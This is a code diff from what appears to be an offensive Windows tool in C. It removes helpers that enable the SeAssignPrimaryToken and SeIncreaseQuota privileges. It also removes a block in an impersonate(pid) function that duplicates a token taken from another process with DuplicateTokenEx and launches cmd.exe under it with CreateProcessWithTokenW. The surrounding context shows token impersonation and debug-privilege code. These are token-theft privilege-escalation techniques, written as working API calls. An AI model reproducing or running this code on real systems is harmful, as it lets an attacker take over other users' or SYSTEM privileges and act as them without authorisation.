@@ -199,71 +199,6 @@ char *enableDebugPrivilege() {
     return result;
 }
 
-BOOL enableAssignPrimaryTokenPrivilege() { 
-    HANDLE hToken;
-    
-    // Open the process token
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        return FALSE;
-    }
-
-    LUID luid;
-    // Look up the LUID for the "Assign Primary Token" privilege
-    if (!LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid)) {
-        CloseHandle(hToken);
-        return FALSE;
-    }
-
-    TOKEN_PRIVILEGES tp;
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-    // Adjust the token privileges
-    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
-        CloseHandle(hToken);
-        return FALSE;
-    }
-
-    CloseHandle(hToken);
-    
-    // Success messages    
-    return TRUE;
-}
-
-BOOL enableIncreaseQuotaPrivilege() { 
-    HANDLE hToken;
-
-    // Open the process token
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        return FALSE;
-    }
-
-    LUID luid;
-    // Look up the LUID for the "Increase Quota" privilege
-    if (!LookupPrivilegeValue(NULL, SE_INCREASE_QUOTA_NAME, &luid)) {
-        CloseHandle(hToken);
-        return FALSE;
-    }
-
-    TOKEN_PRIVILEGES tp;
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-    // Adjust the token privileges
-    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
-        CloseHandle(hToken);
-        return FALSE;
-    }
-
-    CloseHandle(hToken);
-    
-    // Success
-    return TRUE;
-}
-
-
 char *getName(){
     char username[256]; 
     DWORD username_len = sizeof(username);  // Length of the buffer
@@ -325,7 +260,6 @@ char *impersonate(int pid){
     char *newUser = getName();
     char *impersonation = "[+] Impersonation successfull.\r\n";
     HANDLE hUserToken;
-    enableAssignPrimaryTokenPrivilege();
     if (hToken) {
         open = "[+] Obtained duplicated token.\r\n";
         
@@ -335,25 +269,6 @@ char *impersonate(int pid){
             CloseHandle(hToken);
         }
         newUser = getName();
-        // Call DuplicateTokenEx(), print return code and error code
-        BOOL duplicateToken = DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hUserToken);
-        if (duplicateToken){
-            printf("[+] DuplicateTokenEx() success!\n");
-        }
-        else{
-            printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
-            printf("[-] DuplicateTokenEx() Error: %i\n", GetLastError());
-        }
-
-        // Call CreateProcessWithTokenW(), print return code and error code
-        BOOL createProcess = CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi);
-        if (createProcess){
-            printf("[+] Process spawned!\n");
-        }else{
-            printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
-            printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
-        }
-
         RevertToSelf();
         CloseHandle(hToken);
     }
